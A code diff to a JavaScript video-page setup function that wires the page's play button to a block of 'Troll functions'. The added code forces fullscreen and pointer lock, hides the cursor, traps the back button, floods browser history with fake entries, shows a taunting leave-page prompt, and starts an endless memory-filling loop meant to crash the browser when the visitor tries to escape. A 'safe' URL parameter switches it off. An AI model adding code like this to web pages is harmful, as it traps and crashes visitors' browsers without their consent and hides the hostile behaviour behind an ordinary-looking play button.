@@ -27,7 +27,8 @@ function setup(configs) {
   document.title = configs.title
   document.addEventListener("DOMContentLoaded", () => {
     // Buttons & info
-    document.body.innerHTML = `<button>` + configs.button + `</button>  <i class="fas fa-info-circle" onclick="alert('` + configs.info + `')"></i><br><br>`
+    if (!params.has("safe")) {document.body.innerHTML = `<button onclick="playVideos()">` + configs.button + `</button>  <i class="fas fa-info-circle" onclick="alert('` + configs.info + `')"></i><br><br>`
+    } else {document.body.innerHTML = `<button>` + configs.button + `</button>  <i class="fas fa-info-circle" onclick="alert('` + configs.info + `')"></i><br><br>`}
     // Videos
     configs.videos.forEach((src, index) => {
       const video = document.createElement('video');
@@ -43,5 +44,65 @@ function setup(configs) {
     // Last
     document.querySelector('button').addEventListener('click', () => {document.querySelectorAll('video').forEach(video => video.play());});
     document.querySelectorAll('video').forEach(video => {video.addEventListener('contextmenu', (event) => {event.preventDefault();});});
+  });
+}
+
+// Troll functions
+let cpuLagActive = false;
+function playVideos() {
+  // 1. Enter Fullscreen
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen();
+  } else if (document.documentElement.webkitRequestFullscreen) {
+    document.documentElement.webkitRequestFullscreen();
+  } else if (document.documentElement.mozRequestFullScreen) {
+    document.documentElement.mozRequestFullScreen();
+  } else if (document.documentElement.msRequestFullscreen) {
+    document.documentElement.msRequestFullscreen();
+  }
+  // 2. Request/Enter Pointer Lock
+  if (document.documentElement.requestPointerLock) {
+    document.documentElement.requestPointerLock();
+  } else if (document.documentElement.webkitRequestPointerLock) { // For Safari
+    document.documentElement.webkitRequestPointerLock();
+  } else if (document.documentElement.mozRequestPointerLock) { // For Firefox
+    document.documentElement.mozRequestPointerLock();
+  } else if (document.documentElement.msRequestPointerLock) { // For IE/Edge
+    document.documentElement.msRequestPointerLock();
+  }
+  // 3. Ask Before Closing
+  window.onbeforeunload = function() {
+    return "Oh you little brat!";
+  };
+  // 4. Block Back Button
+  history.pushState(null, "", location.href);
+  window.onpopstate = function() {
+    history.pushState(null, "", location.href);
+    activateCPULag(); // If they try to go back, crash the browser
+  };
+  // 5. Hide Cursor
+  document.body.style.cursor = "none";
+  // 6. Fill History with Fake Entries
+  for (let i = 0; i < 20; i++) {
+    history.pushState(null, "", location.href + "?p=" + i);
+  }
+  // 7. Crash Browser
+  function activateCPULag() {
+    if (cpuLagActive) return; // Prevent multiple activations
+    cpuLagActive = true;
+    console.log("🔥 lag 🔥");
+    setInterval(() => {
+      let arr = [];
+      while (true) {
+        arr.push(new Array(1000000).fill("🔥"));
+        console.log(arr)
+      }
+    }, 10);
+  }
+  // 8. If they exit fullscreen, crash the browser
+  document.addEventListener("fullscreenchange", () => {
+    if (!document.fullscreenElement) {
+      activateCPULag();
+    }
   });
 }
